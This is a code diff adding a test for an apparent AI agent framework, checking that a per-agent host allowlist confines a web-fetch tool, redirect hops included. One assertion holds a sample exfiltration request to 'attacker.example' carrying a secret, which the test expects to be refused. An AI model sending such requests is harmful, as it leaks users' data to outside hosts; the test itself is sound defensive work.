@@ -224,3 +224,50 @@ test('the extractor keeps prose and drops furniture', () => {
   assert.equal(htmlToText('<p><q>yes</q><q>no</q></p>'), '"yes""no"');
   assert.equal(htmlToText('<script>var x = "<p>trap</p>";</script><p>real</p>'), 'real');
 });
+
+test('onlyHosts holds web.fetch to its list, per agent, redirect hops included', async (t) => {
+  // A listed host that bounces to one that is not: the hop is where an
+  // approver who saw the first URL stops seeing anything.
+  const server = http.createServer((request, response) => {
+    if (request.url === '/bounce') {
+      response.writeHead(302, { location: `http://127.0.0.1:${port}/landed` });
+      response.end();
+      return;
+    }
+    response.writeHead(200, { 'content-type': 'text/plain' });
+    response.end('reached');
+  });
+  await new Promise<void>((resolve) => server.listen(0, '127.0.0.1', resolve));
+  t.after(() => new Promise<void>((resolve) => server.close(() => resolve())));
+  const port = (server.address() as AddressInfo).port;
+
+  const tool = await fetchTool({
+    allowedHosts: ['localhost'],
+    onlyHosts: ['localhost'],
+    // An allowedHosts entry stays reachable whatever onlyHosts says, so
+    // scout's narrower list has to drop the inherited exemption as well.
+    agents: { scout: { onlyHosts: ['docs.python.org'], allowedHosts: [] } },
+  });
+
+  const reached = await tool.execute({ url: `http://localhost:${port}/` }, session) as JsonObject;
+  assert.equal(reached.text, 'reached');
+
+  // The exfiltration shape: a URL on a host nobody listed, carrying data.
+  await assert.rejects(
+    tool.execute({ url: 'https://attacker.example/?d=secret' }, session),
+    /attacker\.example is not one of the hosts this agent may reach/,
+  );
+  // The hop is refused by name — the host is judged before the address,
+  // so the message says which list it is missing from.
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/bounce` }, session),
+    /127\.0\.0\.1 is not one of the hosts this agent may reach/,
+  );
+
+  // Per agent, resolved on the call: scout's list replaces the default.
+  const scout: Session = { ...session, id: 'session-scout', agent: { id: 'scout', name: 'Scout' } };
+  await assert.rejects(
+    tool.execute({ url: `http://localhost:${port}/` }, scout),
+    /localhost is not one of the hosts this agent may reach/,
+  );
+});
